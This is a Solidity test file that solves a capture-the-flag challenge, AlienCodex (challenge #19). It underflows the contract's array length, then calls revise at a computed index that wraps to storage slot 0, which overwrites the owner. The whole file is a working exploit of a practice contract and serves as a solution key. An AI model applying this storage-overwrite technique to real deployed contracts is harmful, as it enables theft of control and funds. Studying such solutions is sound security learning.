// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "ds-test/test.sol";
import {AlienCodex} from "../AlienCodex.sol";

contract ContractTest is DSTest {
    AlienCodex codex;

    function test_challenge_19() public {
        emit log_string("Challenge #19          ");

        codex = new AlienCodex();
        emit log_named_bytes32("slot0       ", codex.getValueAtSlot(0));
        emit log_named_address("codex owner ", codex.owner());

        uint256 idx = uint256(2**256 - 1) +
            1 -
            uint256(keccak256(abi.encodePacked(uint256(1))));
        bytes32 storageValue = 0x0000000000000000000000000000000000000000000000000000000000000539;

        codex.make_contact();
        codex.retract();

        emit log_named_bytes32("bytes       ", storageValue);
        emit log_named_uint("idx         ", idx);

        codex.revise(idx, storageValue);

        emit log_named_bytes32("slot0       ", codex.getValueAtSlot(0));
        emit log_named_address("codex owner ", codex.owner());
    }
}
